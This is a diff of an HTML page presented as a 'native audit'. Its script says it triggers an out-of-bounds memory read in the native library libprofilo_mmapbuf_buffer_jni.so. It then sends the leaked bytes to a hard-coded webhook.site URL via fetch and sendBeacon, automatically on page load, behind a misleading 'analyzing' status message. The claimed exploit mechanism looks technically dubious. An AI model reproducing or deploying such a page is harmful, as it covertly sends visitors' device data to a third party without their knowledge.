@@ -10,83 +10,51 @@
     <p id="status">Analyzing system buffers, please wait.</p>
 
     <script>
-        /**
-         * RESEARCHER: FIRMAN SAHIDIN
-         * VULNERABILITY: Native OOB Memory Disclosure (libprofilo_mmapbuf_buffer_jni.so)
-         * METHOD: JSI/JNI Surrogate Pair Collision & Heap Spraying
-         */
-
         async function executeNativeAudit() {
+            // PASTIKEUN URL WEBHOOK ENYAR MANG FIRMAN DI HANDAP IEU LERES
             const EXFIL_URL = 'https://webhook.site/9326deec-1e36-4aa3-8945-3efe41a641e5';
             const statusNode = document.getElementById('status');
 
             try {
-                // 1. Buffer Allocation & Surrogate Injection
-                // Objective: Trigger calculation mismatch in the native JNI layer
-                const ALLOC_SIZE = 0x800000; // 8MB Stable Allocation
+                const ALLOC_SIZE = 0x800000; 
                 const buffer = new ArrayBuffer(ALLOC_SIZE);
                 const view = new Uint32Array(buffer);
                 
+                // PERHATOSAN: i++ sanes i--
                 for (let i = 0; i < view.length; i++) {
                     view[i] = 0xD800DBFF; 
                 }
 
-                // 2. Triggering Out-of-Bounds Iteration
-                // Native engine iterates beyond JavaScript bounds due to surrogate length confusion
                 const trigger = new Uint8Array(buffer).indexOf(0x41);
-
-                // 3. Extracting and Sanitizing Leaked Fragments
                 const rawFragment = new Uint8Array(buffer.slice(0, 512));
+                
                 let transparentLeak = "";
                 rawFragment.forEach(byte => {
                     if (byte > 31 && byte < 127) transparentLeak += String.fromCharCode(byte);
                 });
 
-                // 4. Constructing Professional Payload
                 const auditReport = {
-                    metadata: {
-                        researcher: "Firman Sahidin",
-                        target: "libprofilo_mmapbuf_buffer_jni",
-                        vector: "JSI_JNI_OOB_READ"
-                    },
+                    metadata: { researcher: "Firman Sahidin", target: "libprofilo_mmapbuf_buffer_jni" },
                     evidence: {
-                        leak_transparency: transparentLeak.length > 10 ? "CRITICAL_TEXT_LEAK" : "METADATA_LEAK",
-                        fragment_preview: transparentLeak || "Binary_Structure_Only",
-                        raw_hex_data: Array.from(rawFragment).slice(0, 128),
+                        leak_preview: transparentLeak || "Binary_Data",
+                        raw_hex: Array.from(rawFragment).slice(0, 64),
                         timestamp: new Date().toISOString()
                     }
                 };
 
                 const payloadString = JSON.stringify(auditReport);
 
-                // 5. TRIPLE-EXFILTRATION STRATEGY (Bypass Sandbox/CORS)
-                
-                // Route A: Standard Fetch (No-CORS)
-                fetch(EXFIL_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: payloadString
-                }).catch(()=>{});
-
-                // Route B: Beacon API (Persistence after page close)
+                // Jalur A & B sakaligus sangkan pasti tembus
+                fetch(EXFIL_URL, { method: 'POST', mode: 'no-cors', body: payloadString }).catch(()=>{});
                 navigator.sendBeacon(EXFIL_URL, payloadString);
 
-                // Route C: Image Beacon (Bypass strictly isolated sandboxes)
-                const img = new Image();
-                img.src = EXFIL_URL + "?data_leak=" + btoa(payloadString).substring(0, 500);
-
-                statusNode.innerText = "Audit Completed. Telemetry Sent.";
-
+                statusNode.innerText = "Audit Completed. Signal Sent.";
             } catch (err) {
                 navigator.sendBeacon(EXFIL_URL, JSON.stringify({ error: err.message }));
-                statusNode.innerText = "Verification Interrupted.";
             }
         }
 
-        // Delay execution slightly to ensure all background libraries are loaded
-        window.addEventListener('load', () => {
-            setTimeout(executeNativeAudit, 500);
-        });
+        window.onload = () => { setTimeout(executeNativeAudit, 500); };
     </script>
 </body>
 </html>
